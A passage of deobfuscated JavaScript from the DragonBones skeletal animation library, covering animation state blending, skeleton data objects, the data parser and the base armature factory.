							d && this._armature._arriveAtFrame(this._currentFrame, null, this, !0), d = !0, this._currentFrame ? (e = b.indexOf(this._currentFrame), e++, e >= b.length && (e = 0), this._currentFrame = b[e]) : this._currentFrame = b[0];
						d && this._armature._arriveAtFrame(this._currentFrame, null, this, !1)
					}
				}
				if (0 < this._fadeState)
					0 == this._fadeInTime ? (this._fadeWeight =
							1, this._fadeState = 0, this.isPlaying = !0, this._armature.hasEventListener(f.AnimationEvent.FADE_IN_COMPLETE) && (b = new f.AnimationEvent(f.AnimationEvent.FADE_IN_COMPLETE), b.animationState = this, this._armature._eventList.push(b))) : (this._fadeWeight = this.currentTime / this._fadeInTime, 1 <= this._fadeWeight && (this._fadeWeight = 1, this._fadeState = 0, this.isPlaying || (this.currentTime -= this._fadeInTime), this.isPlaying = !0, this._armature.hasEventListener(f.AnimationEvent.FADE_IN_COMPLETE) && (b = new f.AnimationEvent(f.AnimationEvent.FADE_IN_COMPLETE),
								b.animationState = this, this._armature._eventList.push(b))));
				else if (0 > this._fadeState) {
					if (0 == this._fadeOutTime)
						return this._fadeState = this._fadeWeight = 0, this._armature.hasEventListener(f.AnimationEvent.FADE_OUT_COMPLETE) && (b = new f.AnimationEvent(f.AnimationEvent.FADE_OUT_COMPLETE), b.animationState = this, this._armature._eventList.push(b)), !0;
					this._fadeWeight = (1 - (this.currentTime - this._fadeOutBeginTime) / this._fadeOutTime) * this._fadeOutWeight;
					if (0 >= this._fadeWeight)
						return this._fadeState = this._fadeWeight =
							0, this._armature.hasEventListener(f.AnimationEvent.FADE_OUT_COMPLETE) && (b = new f.AnimationEvent(f.AnimationEvent.FADE_OUT_COMPLETE), b.animationState = this, this._armature._eventList.push(b)), !0
				}
				c && (this.isComplete = !0, 0 > this.loop && this.fadeOut((this._fadeOutWeight || this._fadeInTime) / this.timeScale, !0));
				return !1
			};
			a.prototype.updateTimelineStates = function () {
				if (this._mixingTransforms) {
					for (var a in this._timelineStates)
						null == this._mixingTransforms[a] && this.removeTimelineState(a);
					for (a in this._mixingTransforms)
						this._timelineStates[a] ||
						this.addTimelineState(a)
				} else
					for (a in this.clip.getTimelines())
						this._timelineStates[a] || this.addTimelineState(a)
			};
			a.prototype.addTimelineState = function (a) {
				var b = this._armature.getBone(a);
				if (b) {
					var c = k._borrowObject(),
					d = this.clip.getTimeline(a);
					c.fadeIn(b, this, d);
					this._timelineStates[a] = c
				}
			};
			a.prototype.removeTimelineState = function (a) {
				k._returnObject(this._timelineStates[a]);
				delete this._timelineStates[a]
			};
			a.prototype.clear = function () {
				this.clip = null;
				this.enabled = !1;
				this._mixingTransforms = this._currentFrame =
					this._armature = null;
				for (var a in this._timelineStates)
					this.removeTimelineState(a)
			};
			a._pool = [];
			return a
		}
		();
		c.AnimationState = m;
		m.prototype.__class__ = "dragonBones.animation.AnimationState";
		d = function () {
			function a(b) {
				this._armature = b;
				this._animationLayer = [];
				this._isPlaying = !1;
				this.animationNameList = [];
				this.tweenEnabled = !0;
				this.timeScale = 1
			}
			a.prototype.getLastAnimationName = function () {
				return this._lastAnimationState ? this._lastAnimationState.name : null
			};
			a.prototype.getLastAnimationState = function () {
				return this._lastAnimationState
			};
			a.prototype.getAnimationDataList = function () {
				return this._animationDataList
			};
			a.prototype.setAnimationDataList = function (a) {
				this._animationDataList = a;
				this.animationNameList.length = 0;
				for (var b in this._animationDataList)
					this.animationNameList[this.animationNameList.length] = this._animationDataList[b].name
			};
			a.prototype.getIsPlaying = function () {
				return this._isPlaying && !this.getIsComplete()
			};
			a.prototype.getIsComplete = function () {
				if (this._lastAnimationState) {
					if (!this._lastAnimationState.isComplete)
						return !1;
					for (var a = this._animationLayer.length; a--; )
						for (var b = this._animationLayer[a], c = b.length; c--; )
							if (!b[c].isComplete)
								return !1;
					return !0
				}
				return !1
			};
			a.prototype.dispose = function () {
				if (this._armature) {
					this.stop();
					for (var a = this._animationLayer.length; a--; ) {
						for (var b = this._animationLayer[a], c = b.length; c--; )
							m._returnObject(b[c]);
						b.length = 0
					}
					this._animationLayer.length = 0;
					this.animationNameList.length = 0;
					this.animationNameList = this._animationDataList = this._animationLayer = this._armature = null
				}
			};
			a.prototype.gotoAndPlay =
			function (b, c, d, e, f, k, g, l, h, E) {
				"undefined" === typeof c && (c = -1);
				"undefined" === typeof d && (d = -1);
				"undefined" === typeof e && (e = NaN);
				"undefined" === typeof f && (f = 0);
				"undefined" === typeof k && (k = null);
				"undefined" === typeof g && (g = a.SAME_LAYER_AND_GROUP);
				"undefined" === typeof l && (l = !0);
				"undefined" === typeof h && (h = !0);
				"undefined" === typeof E && (E = !0);
				if (!this._animationDataList)
					return null;
				for (var u = this._animationDataList.length, C; u--; )
					if (this._animationDataList[u].name == b) {
						C = this._animationDataList[u];
						break
					}
				if (!C)
					return null;
				this._isPlaying = !0;
				c = 0 > c ? 0 > C.fadeInTime ? 0.3 : C.fadeInTime : c;
				d = 0 > d ? 0 > C.scale ? 1 : C.scale : d / C.duration;
				e = isNaN(e) ? C.loop : e;
				f = this.addLayer(f);
				var s;
				switch (g) {
				case a.NONE:
					break;
				case a.SAME_LAYER:
					s = this._animationLayer[f];
					for (u = s.length; u--; )
						g = s[u], g.fadeOut(c, h);
					break;
				case a.SAME_GROUP:
					for (y = this._animationLayer.length; y--; )
						for (s = this._animationLayer[y], u = s.length; u--; )
							g = s[u], g.group == k && g.fadeOut(c, h);
					break;
				case a.ALL:
					for (var y = this._animationLayer.length; y--; )
						for (s = this._animationLayer[y], u = s.length; u--; )
							g =
								s[u], g.fadeOut(c, h);
					break;
				default:
					for (s = this._animationLayer[f], u = s.length; u--; )
						g = s[u], g.group == k && g.fadeOut(c, h)
				}
				this._lastAnimationState = m._borrowObject();
				this._lastAnimationState.group = k;
				this._lastAnimationState.tweenEnabled = this.tweenEnabled;
				this._lastAnimationState.fadeIn(this._armature, C, c, 1 / d, e, f, l, E);
				this.addState(this._lastAnimationState);
				e = this._armature._slotList;
				for (u = e.length; u--; )
					f = e[u], (f = f.getChildArmature()) && f.animation.gotoAndPlay(b, c);
				return this._lastAnimationState
			};
			a.prototype.play =
			function () {
				this._animationDataList && 0 != this._animationDataList.length && (this._lastAnimationState ? this._isPlaying ? this.gotoAndPlay(this._lastAnimationState.name) : this._isPlaying = !0 : this.gotoAndPlay(this._animationDataList[0].name))
			};
			a.prototype.stop = function () {
				this._isPlaying = !1
			};
			a.prototype.getState = function (a, b) {
				"undefined" === typeof b && (b = 0);
				var c = this._animationLayer.length;
				if (0 == c)
					return null;
				b >= c && (b = c - 1);
				c = this._animationLayer[b];
				if (!c)
					return null;
				for (var d = c.length; d--; )
					if (c[d].name == a)
						return c[d];
				return null
			};
			a.prototype.hasAnimation = function (a) {
				for (var b = this._animationDataList.length; b--; )
					if (this._animationDataList[b].name == a)
						return !0;
				return !1
			};
			a.prototype.advanceTime = function (a) {
				if (this._isPlaying) {
					a *= this.timeScale;
					var b = this._armature._boneList.length,
					c,
					d,
					e = b,
					f,
					k,
					m,
					g,
					l,
					n,
					h,
					q,
					u,
					y,
					G,
					I,
					M,
					N,
					F,
					K,
					H;
					for (b--; e--; ) {
						k = this._armature._boneList[e];
						m = k.name;
						g = 1;
						I = G = y = u = q = h = n = l = 0;
						for (c = this._animationLayer.length; c--; ) {
							M = 0;
							N = this._animationLayer[c];
							f = N.length;
							for (d = 0; d < f; d++)
								F = N[d], e == b && F.advanceTime(a) ?
								(this.removeState(F), d--, f--) : (K = F._timelineStates[m]) && K.tweenActive && (F = F._fadeWeight * F.weight * g, H = K.transform, K = K.pivot, l += H.x * F, n += H.y * F, h += H.skewX * F, q += H.skewY * F, u += H.scaleX * F, y += H.scaleY * F, G += K.x * F, I += K.y * F, M += F);
							if (M >= g)
								break;
							else
								g -= M
						}
						H = k.tween;
						K = k._tweenPivot;
						H.x = l;
						H.y = n;
						H.skewX = h;
						H.skewY = q;
						H.scaleX = u;
						H.scaleY = y;
						K.x = G;
						K.y = I
					}
				}
			};
			a.prototype.addLayer = function (a) {
				a >= this._animationLayer.length && (a = this._animationLayer.length, this._animationLayer[a] = []);
				return a
			};
			a.prototype.addState = function (a) {
				this._animationLayer[a.layer].push(a)
			};
			a.prototype.removeState = function (a) {
				var b = a.layer,
				c = this._animationLayer[b];
				c.splice(c.indexOf(a), 1);
				m._returnObject(a);
				0 == c.length && b == this._animationLayer.length - 1 && this._animationLayer.length--
			};
			a.NONE = "none";
			a.SAME_LAYER = "sameLayer";
			a.SAME_GROUP = "sameGroup";
			a.SAME_LAYER_AND_GROUP = "sameLayerAndGroup";
			a.ALL = "all";
			return a
		}
		();
		c.Animation = d;
		d.prototype.__class__ = "dragonBones.animation.Animation"
	})(d.animation || (d.animation = {}));
	var c = d.animation;
	(function (a) {
		var c = function () {
			function a() {
				this.skewY =
					this.skewX = this.y = this.x = 0;
				this.scaleY = this.scaleX = 1
			}
			a.prototype.getRotation = function () {
				return this.skewX
			};
			a.prototype.setRotation = function (a) {
				this.skewX = this.skewY = a
			};
			a.prototype.copy = function (a) {
				this.x = a.x;
				this.y = a.y;
				this.skewX = a.skewX;
				this.skewY = a.skewY;
				this.scaleX = a.scaleX;
				this.scaleY = a.scaleY
			};
			a.prototype.toString = function () {
				return "[DBTransform (x=" + this.x + " y=" + this.y + " skewX=" + this.skewX + " skewY=" + this.skewY + " scaleX=" + this.scaleX + " scaleY=" + this.scaleY + ")]"
			};
			return a
		}
		();
		a.DBTransform = c;
		c.prototype.__class__ =
			"dragonBones.objects.DBTransform";
		var d = function () {
			function a() {
				this.duration = this.position = 0
			}
			a.prototype.dispose = function () {};
			return a
		}
		();
		a.Frame = d;
		d.prototype.__class__ = "dragonBones.objects.Frame";
		var f = function (a) {
			function b() {
				a.call(this);
				this.displayIndex = this.tweenRotate = this.tweenEasing = 0;
				this.zOrder = NaN;
				this.visible = !0;
				this.global = new c;
				this.transform = new c;
				this.pivot = new e.Point
			}
			__extends(b, a);
			b.prototype.dispose = function () {
				a.prototype.dispose.call(this);
				this.color = this.pivot = this.transform =
					this.global = null
			};
			return b
		}
		(d);
		a.TransformFrame = f;
		f.prototype.__class__ = "dragonBones.objects.TransformFrame";
		var m = function () {
			function a() {
				this._frameList = [];
				this.duration = 0;
				this.scale = 1
			}
			a.prototype.getFrameList = function () {
				return this._frameList
			};
			a.prototype.dispose = function () {
				for (var a = this._frameList.length; a--; )
					this._frameList[a].dispose();
				this._frameList.length = 0;
				this._frameList = null
			};
			a.prototype.addFrame = function (a) {
				if (!a)
					throw Error();
				if (0 > this._frameList.indexOf(a))
					this._frameList[this._frameList.length] =
						a;
				else
					throw Error();
			};
			return a
		}
		();
		a.Timeline = m;
		m.prototype.__class__ = "dragonBones.objects.Timeline";
		var h = function (a) {
			function b() {
				a.call(this);
				this.originTransform = new c;
				this.originPivot = new e.Point;
				this.offset = 0;
				this.transformed = !1
			}
			__extends(b, a);
			b.prototype.dispose = function () {
				this != b.HIDE_TIMELINE && (a.prototype.dispose.call(this), this.originPivot = this.originTransform = null)
			};
			b.HIDE_TIMELINE = new b;
			return b
		}
		(m);
		a.TransformTimeline = h;
		h.prototype.__class__ = "dragonBones.objects.TransformTimeline";
		var u =
		function (a) {
			function b() {
				a.call(this);
				this.loop = this.frameRate = 0;
				this.tweenEasing = NaN;
				this.fadeInTime = 0;
				this._timelines = {}

			}
			__extends(b, a);
			b.prototype.getTimelines = function () {
				return this._timelines
			};
			b.prototype.dispose = function () {
				a.prototype.dispose.call(this);
				for (var b in this._timelines)
					this._timelines[b].dispose();
				this._timelines = null
			};
			b.prototype.getTimeline = function (a) {
				return this._timelines[a]
			};
			b.prototype.addTimeline = function (a, b) {
				if (!a)
					throw Error();
				this._timelines[b] = a
			};
			return b
		}
		(m);
		a.AnimationData =
			u;
		u.prototype.__class__ = "dragonBones.objects.AnimationData";
		var y = function () {
			function a() {
				this.transform = new c
			}
			a.prototype.dispose = function () {
				this.pivot = this.transform = null
			};
			a.ARMATURE = "armature";
			a.IMAGE = "image";
			return a
		}
		();
		a.DisplayData = y;
		y.prototype.__class__ = "dragonBones.objects.DisplayData";
		var z = function () {
			function a() {
				this._displayDataList = [];
				this.zOrder = 0;
				this.blendMode = "normal"
			}
			a.prototype.getDisplayDataList = function () {
				return this._displayDataList
			};
			a.prototype.dispose = function () {
				for (var a =
						this._displayDataList.length; a--; )
					this._displayDataList[a].dispose();
				this._displayDataList.length = 0;
				this._displayDataList = null
			};
			a.prototype.addDisplayData = function (a) {
				if (!a)
					throw Error();
				if (0 > this._displayDataList.indexOf(a))
					this._displayDataList[this._displayDataList.length] = a;
				else
					throw Error();
			};
			a.prototype.getDisplayData = function (a) {
				for (var b = this._displayDataList.length; b--; )
					if (this._displayDataList[b].name == a)
						return this._displayDataList[b];
				return null
			};
			return a
		}
		();
		a.SlotData = z;
		z.prototype.__class__ =
			"dragonBones.objects.SlotData";
		var v = function () {
			function a() {
				this.length = 0;
				this.global = new c;
				this.transform = new c;
				this.scaleMode = 1;
				this.fixedRotation = !1
			}
			a.prototype.dispose = function () {
				this.transform = this.global = null
			};
			return a
		}
		();
		a.BoneData = v;
		v.prototype.__class__ = "dragonBones.objects.BoneData";
		var A = function () {
			function a() {
				this._slotDataList = []
			}
			a.prototype.getSlotDataList = function () {
				return this._slotDataList
			};
			a.prototype.dispose = function () {
				for (var a = this._slotDataList.length; a--; )
					this._slotDataList[a].dispose();
				this._slotDataList.length = 0;
				this._slotDataList = null
			};
			a.prototype.getSlotData = function (a) {
				for (var b = this._slotDataList.length; b--; )
					if (this._slotDataList[b].name == a)
						return this._slotDataList[b];
				return null
			};
			a.prototype.addSlotData = function (a) {
				if (!a)
					throw Error();
				if (0 > this._slotDataList.indexOf(a))
					this._slotDataList[this._slotDataList.length] = a;
				else
					throw Error();
			};
			return a
		}
		();
		a.SkinData = A;
		A.prototype.__class__ = "dragonBones.objects.SkinData";
		var t = function () {
			function a() {
				this._boneDataList = [];
				this._skinDataList =
					[];
				this._animationDataList = []
			}
			a.prototype.getBoneDataList = function () {
				return this._boneDataList
			};
			a.prototype.getSkinDataList = function () {
				return this._skinDataList
			};
			a.prototype.getAnimationDataList = function () {
				return this._animationDataList
			};
			a.prototype.dispose = function () {
				for (var a = this._boneDataList.length; a--; )
					this._boneDataList[a].dispose();
				for (a = this._skinDataList.length; a--; )
					this._skinDataList[a].dispose();
				for (a = this._animationDataList.length; a--; )
					this._animationDataList[a].dispose();
				this._boneDataList.length =
					0;
				this._skinDataList.length = 0;
				this._animationDataList.length = 0;
				this._animationDataList = this._skinDataList = this._boneDataList = null
			};
			a.prototype.getBoneData = function (a) {
				for (var b = this._boneDataList.length; b--; )
					if (this._boneDataList[b].name == a)
						return this._boneDataList[b];
				return null
			};
			a.prototype.getSkinData = function (a) {
				if (!a)
					return this._skinDataList[0];
				for (var b = this._skinDataList.length; b--; )
					if (this._skinDataList[b].name == a)
						return this._skinDataList[b];
				return null
			};
			a.prototype.getAnimationData = function (a) {
				for (var b =
						this._animationDataList.length; b--; )
					if (this._animationDataList[b].name == a)
						return this._animationDataList[b];
				return null
			};
			a.prototype.addBoneData = function (a) {
				if (!a)
					throw Error();
				if (0 > this._boneDataList.indexOf(a))
					this._boneDataList[this._boneDataList.length] = a;
				else
					throw Error();
			};
			a.prototype.addSkinData = function (a) {
				if (!a)
					throw Error();
				if (0 > this._skinDataList.indexOf(a))
					this._skinDataList[this._skinDataList.length] = a;
				else
					throw Error();
			};
			a.prototype.addAnimationData = function (a) {
				if (!a)
					throw Error();
				0 > this._animationDataList.indexOf(a) && (this._animationDataList[this._animationDataList.length] = a)
			};
			a.prototype.sortBoneDataList = function () {
				var a = this._boneDataList.length;
				if (0 != a) {
					for (var b = []; a--; ) {
						for (var c = this._boneDataList[a], d = 0, e = c; e && e.parent; )
							d++, e = this.getBoneData(e.parent);
						b[a] = {
							level : d,
							boneData : c
						}
					}
					b.sort(this.sortBoneData);
					for (a = b.length; a--; )
						this._boneDataList[a] = b[a].boneData
				}
			};
			a.prototype.sortBoneData = function (a, b) {
				return a.level > b.level ? 1 : -1
			};
			return a
		}
		();
		a.ArmatureData = t;
		t.prototype.__class__ =
			"dragonBones.objects.ArmatureData";
		var B = function () {
			function a() {
				this._armatureDataList = [];
				this._subTexturePivots = {}

			}
			a.prototype.getArmatureNames = function () {
				var a = [],
				b;
				for (b in this._armatureDataList)
					a[a.length] = this._armatureDataList[b].name;
				return a
			};
			a.prototype.getArmatureDataList = function () {
				return this._armatureDataList
			};
			a.prototype.dispose = function () {
				for (var a in this._armatureDataList)
					this._armatureDataList[a].dispose();
				this._armatureDataList.length = 0;
				this._subTexturePivots = this._armatureDataList =
					null
			};
			a.prototype.getArmatureData = function (a) {
				for (var b = this._armatureDataList.length; b--; )
					if (this._armatureDataList[b].name == a)
						return this._armatureDataList[b];
				return null
			};
			a.prototype.addArmatureData = function (a) {
				if (!a)
					throw Error();
				if (0 > this._armatureDataList.indexOf(a))
					this._armatureDataList[this._armatureDataList.length] = a;
				else
					throw Error();
			};
			a.prototype.removeArmatureData = function (a) {
				a = this._armatureDataList.indexOf(a);
				0 <= a && this._armatureDataList.splice(a, 1)
			};
			a.prototype.removeArmatureDataByName =
			function (a) {
				for (var b = this._armatureDataList.length; b--; )
					this._armatureDataList[b].name == a && this._armatureDataList.splice(b, 1)
			};
			a.prototype.getSubTexturePivot = function (a) {
				return this._subTexturePivots[a]
			};
			a.prototype.addSubTexturePivot = function (a, b, c) {
				var d = this._subTexturePivots[c];
				d ? (d.x = a, d.y = b) : this._subTexturePivots[c] = d = new e.Point(a, b);
				return d
			};
			a.prototype.removeSubTexturePivot = function (a) {
				if (a)
					delete this._subTexturePivots[a];
				else
					for (a in this._subTexturePivots)
						delete this._subTexturePivots[a]
			};
			return a
		}
		();
		a.SkeletonData = B;
		B.prototype.__class__ = "dragonBones.objects.SkeletonData";
		m = function () {
			function a() {}

			a.parseTextureAtlasData = function (a, c) {
				"undefined" === typeof c && (c = 1);
				if (!a)
					throw Error();
				var d = {};
				d.__name = a[b.ConstValues.A_NAME];
				var f = a[b.ConstValues.SUB_TEXTURE],
				k;
				for (k in f) {
					var m = f[k],
					g = m[b.ConstValues.A_NAME],
					m = new e.Rectangle(Number(m[b.ConstValues.A_X]) / c, Number(m[b.ConstValues.A_Y]) / c, Number(m[b.ConstValues.A_WIDTH]) / c, Number(m[b.ConstValues.A_HEIGHT]) / c);
					d[g] = m
				}
				return d
			};
			a.parseSkeletonData =
			function (c) {
				if (!c)
					throw Error();
				var d = Number(c[b.ConstValues.A_FRAME_RATE]),
				e = new B;
				e.name = c[b.ConstValues.A_NAME];
				c = c[b.ConstValues.ARMATURE];
				for (var f in c)
					e.addArmatureData(a.parseArmatureData(c[f], e, d));
				return e
			};
			a.parseArmatureData = function (c, d, e) {
				var f = new t;
				f.name = c[b.ConstValues.A_NAME];
				var k = c[b.ConstValues.BONE],
				m;
				for (m in k)
					f.addBoneData(a.parseBoneData(k[m]));
				k = c[b.ConstValues.SKIN];
				for (m in k)
					f.addSkinData(a.parseSkinData(k[m], d));
				b.DBDataUtil.transformArmatureData(f);
				f.sortBoneDataList();
				c = c[b.ConstValues.ANIMATION];
				for (m in c)
					f.addAnimationData(a.parseAnimationData(c[m], f, e));
				return f
			};
			a.parseBoneData = function (c) {
				var d = new v;
				d.name = c[b.ConstValues.A_NAME];
				d.parent = c[b.ConstValues.A_PARENT];
				d.length = Number(c[b.ConstValues.A_LENGTH]) || 0;
				var e = Number(c[b.ConstValues.A_SCALE_MODE]);
				!isNaN(e) && e && (d.scaleMode = e);
				if (e = c[b.ConstValues.A_FIXED_ROTATION])
					d.fixedRotation = e;
				a.parseTransform(c[b.ConstValues.TRANSFORM], d.global);
				d.transform.copy(d.global);
				return d
			};
			a.parseSkinData = function (c,
				d) {
				var e = new A;
				e.name = c[b.ConstValues.A_NAME];
				var f = c[b.ConstValues.SLOT],
				k;
				for (k in f)
					e.addSlotData(a.parseSlotData(f[k], d));
				return e
			};
			a.parseSlotData = function (c, d) {
				var e = new z;
				e.name = c[b.ConstValues.A_NAME];
				e.parent = c[b.ConstValues.A_PARENT];
				e.zOrder = Number(c[b.ConstValues.A_Z_ORDER]);
				e.blendMode = c[b.ConstValues.A_BLENDMODE];
				e.blendMode || (e.blendMode = "normal");
				var f = c[b.ConstValues.DISPLAY],
				k;
				for (k in f)
					e.addDisplayData(a.parseDisplayData(f[k], d));
				return e
			};
			a.parseDisplayData = function (c, d) {
				var e =
					new y;
				e.name = c[b.ConstValues.A_NAME];
				e.type = c[b.ConstValues.A_TYPE];
				e.pivot = d.addSubTexturePivot(0, 0, e.name);
				a.parseTransform(c[b.ConstValues.TRANSFORM], e.transform, e.pivot);
				return e
			};
			a.parseAnimationData = function (c, d, e) {
				var f = new u;
				f.name = c[b.ConstValues.A_NAME];
				f.frameRate = e;
				f.loop = Number(c[b.ConstValues.A_LOOP]) || 0;
				f.fadeInTime = Number(c[b.ConstValues.A_FADE_IN_TIME]);
				f.duration = Number(c[b.ConstValues.A_DURATION]) / e;
				f.scale = Number(c[b.ConstValues.A_SCALE]);
				if (c.hasOwnProperty(b.ConstValues.A_TWEEN_EASING)) {
					var k =
						c[b.ConstValues.A_TWEEN_EASING];
					f.tweenEasing = void 0 == k || null == k ? NaN : Number(k)
				} else
					f.tweenEasing = NaN;
				a.parseTimeline(c, f, a.parseMainFrame, e);
				var m,
				k = c[b.ConstValues.TIMELINE],
				g;
				for (g in k)
					m = k[g], c = a.parseTransformTimeline(m, f.duration, e), m = m[b.ConstValues.A_NAME], f.addTimeline(c, m);
				b.DBDataUtil.addHideTimeline(f, d);
				b.DBDataUtil.transformAnimationData(f, d);
				return f
			};
			a.parseTimeline = function (a, c, d, e) {
				var f = 0,
				k;
				a = a[b.ConstValues.FRAME];
				for (var m in a)
					k = d(a[m], e), k.position = f, c.addFrame(k), f += k.duration;
				k && (k.duration = c.duration - k.position)
			};
			a.parseTransformTimeline = function (c, d, e) {
				var f = new h;
				f.duration = d;
				a.parseTimeline(c, f, a.parseTransformFrame, e);
				f.scale = Number(c[b.ConstValues.A_SCALE]);
				f.offset = Number(c[b.ConstValues.A_OFFSET]);
				return f
			};
			a.parseFrame = function (a, c, d) {
				c.duration = Number(a[b.ConstValues.A_DURATION]) / d;
				c.action = a[b.ConstValues.A_ACTION];
				c.event = a[b.ConstValues.A_EVENT];
				c.sound = a[b.ConstValues.A_SOUND]
			};
			a.parseMainFrame = function (b, c) {
				var e = new d;
				a.parseFrame(b, e, c);
				return e
			};
			a.parseTransformFrame =
			function (c, d) {
				var k = new f;
				a.parseFrame(c, k, d);
				k.visible = 1 != Number(c[b.ConstValues.A_HIDE]);
				if (c.hasOwnProperty(b.ConstValues.A_TWEEN_EASING)) {
					var m = c[b.ConstValues.A_TWEEN_EASING];
					k.tweenEasing = void 0 == m || null == m ? NaN : Number(m)
				} else
					k.tweenEasing = 0;
				k.tweenRotate = Number(c[b.ConstValues.A_TWEEN_ROTATE]) || 0;
				k.displayIndex = Number(c[b.ConstValues.A_DISPLAY_INDEX]) || 0;
				k.zOrder = Number(c[b.ConstValues.A_Z_ORDER]) || 0;
				a.parseTransform(c[b.ConstValues.TRANSFORM], k.global, k.pivot);
				k.transform.copy(k.global);
				if (m =
						c[b.ConstValues.COLOR_TRANSFORM])
					k.color = new e.ColorTransform, k.color.alphaOffset = Number(m[b.ConstValues.A_ALPHA_OFFSET]), k.color.redOffset = Number(m[b.ConstValues.A_RED_OFFSET]), k.color.greenOffset = Number(m[b.ConstValues.A_GREEN_OFFSET]), k.color.blueOffset = Number(m[b.ConstValues.A_BLUE_OFFSET]), k.color.alphaMultiplier = 0.01 * Number(m[b.ConstValues.A_ALPHA_MULTIPLIER]), k.color.redMultiplier = 0.01 * Number(m[b.ConstValues.A_RED_MULTIPLIER]), k.color.greenMultiplier = 0.01 * Number(m[b.ConstValues.A_GREEN_MULTIPLIER]),
					k.color.blueMultiplier = 0.01 * Number(m[b.ConstValues.A_BLUE_MULTIPLIER]);
				return k
			};
			a.parseTransform = function (a, c, d) {
				"undefined" === typeof d && (d = null);
				a && (c && (c.x = Number(a[b.ConstValues.A_X]), c.y = Number(a[b.ConstValues.A_Y]), c.skewX = Number(a[b.ConstValues.A_SKEW_X]) * b.ConstValues.ANGLE_TO_RADIAN, c.skewY = Number(a[b.ConstValues.A_SKEW_Y]) * b.ConstValues.ANGLE_TO_RADIAN, c.scaleX = Number(a[b.ConstValues.A_SCALE_X]), c.scaleY = Number(a[b.ConstValues.A_SCALE_Y])), d && (d.x = Number(a[b.ConstValues.A_PIVOT_X]), d.y =
							Number(a[b.ConstValues.A_PIVOT_Y])))
			};
			return a
		}
		();
		a.DataParser = m;
		m.prototype.__class__ = "dragonBones.objects.DataParser"
	})(d.objects || (d.objects = {}));
	var a = d.objects;
	(function (b) {
		var c = function (b) {
			function c() {
				b.call(this);
				this._dataDic = {};
				this._textureAtlasDic = {};
				this._textureAtlasLoadingDic = {}

			}
			__extends(c, b);
			c.prototype.getSkeletonData = function (a) {
				return this._dataDic[a]
			};
			c.prototype.addSkeletonData = function (a, b) {
				"undefined" === typeof b && (b = null);
				if (!a)
					throw Error();
				b = b || a.name;
				if (!b)
					throw Error("Unnamed data!");
				this._dataDic[b] = a
			};
			c.prototype.removeSkeletonData = function (a) {
				delete this._dataDic[a]
			};
			c.prototype.getTextureAtlas = function (a) {
				return this._textureAtlasDic[a]
			};
			c.prototype.addTextureAtlas = function (a, b) {
				"undefined" === typeof b && (b = null);
				if (!a)
					throw Error();
				b = b || a.name;
				if (!b)
					throw Error("Unnamed data!");
				this._textureAtlasDic[b] = a
			};
			c.prototype.removeTextureAtlas = function (a) {
				delete this._textureAtlasDic[a]
			};
			c.prototype.dispose = function (a) {
				"undefined" === typeof a && (a = !0);
				if (a) {
					for (var b in this._dataDic)
						this._dataDic[b].dispose();
					for (b in this._textureAtlasDic)
						this._textureAtlasDic[b].dispose()
				}
				this._currentTextureAtlasName = this._currentDataName = this._textureAtlasLoadingDic = this._textureAtlasDic = this._dataDic = null
			};
			c.prototype.buildArmature = function (b, c, d, e, f) {
				if (d) {
					var k = this._dataDic[d];
					if (k)
						var m = k.getArmatureData(b)
				} else
					for (d in this._dataDic)
						if (k = this._dataDic[d], m = k.getArmatureData(b))
							break;
				if (!m)
					return null;
				this._currentDataName = d;
				this._currentTextureAtlasName = e || d;
				e = this._generateArmature();
				e.name = b;
				var g,
				l,
				h = m.getBoneDataList(),
				n;
				for (n in h)
					l = h[n], g = new y, g.name = l.name, g.fixedRotation = l.fixedRotation, g.scaleMode = l.scaleMode, g.origin.copy(l.transform), m.getBoneData(l.parent) ? e.addChild(g, l.parent) : e.addChild(g, null);
				if (c && c != b) {
					var u = k.getArmatureData(c);
					if (!u)
						for (d in this._dataDic)
							if (k = this._dataDic[d], u = k.getArmatureData(c))
								break
				}
				u ? e.animation.setAnimationDataList(u.getAnimationDataList()) : e.animation.setAnimationDataList(m.getAnimationDataList());
				g = m.getSkinData(f);
				if (!g)
					throw Error();
				b = [];
				d = g.getSlotDataList();
				for (n in d)
					if (k =
							d[n], g = e.getBone(k.parent)) {
						f = k.getDisplayDataList();
						c = this._generateSlot();
						c.name = k.name;
						c._blendMode = k.blendMode;
						c._originZOrder = k.zOrder;
						c._dislayDataList = f;
						b.length = 0;
						for (k = f.length; k--; )
							switch (m = f[k], m.type) {
							case a.DisplayData.ARMATURE:
								(m = this.buildArmature(m.name, null, this._currentDataName, this._currentTextureAtlasName, null)) && (b[k] = m);
								break;
							default:
								b[k] = this._generateDisplay(this._textureAtlasDic[this._currentTextureAtlasName], m.name, m.pivot.x, m.pivot.y)
							}
						c.setDisplayList(b);
						c._changeDisplay(0);
						g.addChild(c)
					}
				e._slotsZOrderChanged = !0;
				e.advanceTime(0);
				return e
			};
			c.prototype.getTextureDisplay = function (a, b, c, d) {
				if (b)
					var e = this._textureAtlasDic[b];
				if (!e && !b)
					for (b in this._textureAtlasDic) {
						e = this._textureAtlasDic[b];
						if (e.getRegion(a))
							break;
						e = null
					}
				if (e) {
					if (isNaN(c) || isNaN(d))
						if (b = this._dataDic[b])
							if (b = b.getSubTexturePivot(a))
								c = b.x, d = b.y;
					return this._generateDisplay(e, a, c, d)
				}
				return null
			};
			c.prototype._generateArmature = function () {
				return null
			};
			c.prototype._generateSlot = function () {
				return null
			};
			c.prototype._generateDisplay =
			function (a, b, c, d) {
				return null
			};
			return c
		}
		(f.EventDispatcher);
		b.BaseFactory = c;
		c.prototype.__class__ = "dragonBones.factorys.BaseFactory"
	})(d.factorys || (d.factorys = {}));
	(function (b) {
		var d = function () {
			function a() {}

			a.ANGLE_TO_RADIAN = Math.PI / 180;
			a.DRAGON_BONES = "dragonBones";
			a.ARMATURE = "armature";
			a.SKIN = "skin";
			a.BONE = "bone";
			a.SLOT = "slot";
			a.DISPLAY = "display";
			a.ANIMATION = "animation";
			a.TIMELINE = "timeline";
			a.FRAME = "frame";
			a.TRANSFORM = "transform";
			a.COLOR_TRANSFORM = "colorTransform";
			a.TEXTURE_ATLAS = "TextureAtlas";
			a.SUB_TEXTURE = "SubTexture";
			a.A_VERSION = "version";
			a.A_IMAGE_PATH = "imagePath";
			a.A_FRAME_RATE = "frameRate";
			a.A_NAME = "name";
			a.A_PARENT = "parent";
			a.A_LENGTH = "length";
			a.A_TYPE = "type";
			a.A_FADE_IN_TIME = "fadeInTime";
			a.A_DURATION = "duration";
			a.A_SCALE = "scale";
			a.A_OFFSET = "offset";
			a.A_LOOP = "loop";
			a.A_EVENT = "event";
			a.A_SOUND = "sound";
			a.A_ACTION = "action";
			a.A_HIDE = "hide";
			a.A_TWEEN_EASING = "tweenEasing";
